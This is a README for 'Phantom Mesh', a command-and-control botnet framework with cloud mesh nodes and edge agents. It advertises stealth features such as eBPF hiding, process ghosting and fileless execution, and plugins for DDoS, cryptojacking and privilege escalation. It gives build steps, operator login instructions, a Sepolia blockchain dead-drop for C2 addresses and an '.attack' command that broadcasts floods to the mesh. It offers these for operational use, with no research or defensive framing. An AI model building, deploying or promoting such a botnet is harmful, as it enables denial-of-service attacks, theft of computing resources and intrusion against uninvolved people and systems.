# Phantom Mesh

A distributed, resilient command-and-control framework with multi-platform support.

## Features

- **Multi-tier Architecture**: Cloud mesh + Edge agents
- **Cryptographic Security**: Ed25519 signed commands
- **Resilient Bootstrap**: 5 fallback discovery methods
- **Cross-platform**: Windows, Linux, macOS
- **Stealth**: eBPF hiding, process ghosting, fileless execution
- **Plugin System**: DDoS, cryptojacking, privilege escalation

## Quick Start

### 1. Build

```bash
# Cloud node (Zig)
make cloud_linux_x64

# Phantom C2 (Rust)
cargo build -p phantom --release

# Edge agent (Rust)
cargo build -p edge --release
```

### 2. Generate Keys

```bash
mkdir -p keys
openssl rand 32 > keys/phantom_c2.key
```

### 3. Run

```bash
# Start Phantom C2
./target/release/phantom --key keys/ --port 12961

# Connect as operator
ssh admin@<phantom-ip> -p 12961
```

### 4. Commands

```
PhantomC2$ help
Available:
  .attack <ip> <port> <duration>  - Broadcast attack to mesh
  .onchain <ip:port>[,ip:port]... - Publish C2 addresses to blockchain
  .count                          - Count all nodes in mesh
  .peers                          - List direct P2P peers
```

## Network Ports

| Port | Protocol | Purpose |
|------|----------|---------|
| 12961 | TCP | SSH C2 (Phantom) |
| 31337 | UDP | P2P mesh (Cloud) |
| 31338 | UDP | P2P mesh (Phantom) |
| 1883 | TCP | Edge proxy |

## Documentation

- [Architecture](docs/ARCHITECTURE.md) - Detailed technical design
- [Smart Contract](smart_contracts/) - Sepolia dead-drop

## Project Structure

```
phantom-mesh/
├── crates/
│   ├── nodes/
│   │   ├── cloud/      # Mesh node (Zig)
│   │   ├── phantom/    # C2 master (Rust)
│   │   └── edge/       # Agent (Rust)
│   ├── plugins/        # DDoS, privesc, etc.
│   └── shared/         # Protocol, plugin API
├── smart_contracts/    # Sepolia fallback
└── docs/               # Architecture docs
```

## License

Proprietary. Unauthorized distribution prohibited.
